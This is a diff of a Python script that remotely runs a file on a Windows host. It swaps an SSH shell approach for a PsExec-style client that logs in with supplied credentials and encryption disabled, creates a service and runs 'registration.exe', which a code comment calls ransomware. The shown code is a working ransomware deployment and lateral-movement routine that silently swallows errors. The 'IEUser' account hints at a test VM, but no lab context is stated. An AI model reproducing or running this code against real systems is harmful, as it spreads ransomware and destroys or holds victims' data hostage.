@@ -78,29 +78,13 @@ def transferFile():
 
 #Remote execute file
 def remoteExecute(ipAddress, user, password):
-    ssh=paramiko.SSHClient()
+    c = Client(ipAddress, username=user, password=password,  encrypt=False)
+    c.connect()
     try:
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh.connect(ipAddress, username=user, password=password)
-        shell= ssh.invoke_shell()
-        stdout, stderr, rcshell.send("C:/Users/IEUser/Downloads/Registration/registration.exe" + "\n")
-
+        c.create_service()
+        stdout, stderr, rc = c.run_executable("C:/Users/IEUser/Downloads/Registration/registration.exe") #Execute ransomware from P Drive
     except:
-        print("this is done")
-    finally:
-        output = []
-        for i in range(0,6):
-            output.append(stdout.readlines(i))
-        print(output)
-
-
-    # c = Client(ipAddress, username=user, password=password,  encrypt=False)
-    # c.connect()
-    # try:
-    #     c.create_service()
-    #     stdout, stderr, rc = c.run_executable("C:/Users/IEUser/Downloads/Registration/registration.exe") #Execute ransomware from P Drive
-    # except:
-    #     print("done")
+        print("done")
 
 def main():
     user= "IEUser"
